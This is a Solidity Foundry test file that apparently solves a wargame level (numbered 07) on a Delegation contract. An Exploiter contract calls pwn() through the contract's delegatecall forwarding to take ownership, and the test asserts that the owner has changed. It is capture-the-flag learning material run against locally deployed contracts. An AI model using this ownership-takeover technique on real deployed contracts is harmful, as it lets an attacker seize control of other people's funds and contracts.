pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/07.sol";

contract Exploiter {

    constructor() {}

    function exploit(address instance) external payable {
        (bool success, ) = instance.call(abi.encodeWithSignature("pwn()"));
        require(success, "Error while calling the instance");
    }

    receive() external payable { }
}

contract Test07 is Test {

    address user = address(0x1);
    Delegation instance;
    Delegate delegate;

    function setUp() public {
        delegate = new Delegate(address(0x2));
        instance = new Delegation(address(delegate));
    }

    function testSolve() public {
        Exploiter exploiter = new Exploiter();
        
        address previousOwner = instance.owner();
        console.log("Previous Owner: ", previousOwner);

        exploiter.exploit(address(instance));

        address newOwner = instance.owner();
        console.log("New Owner: ", newOwner);

        assertEq(newOwner, address(exploiter));
    }

}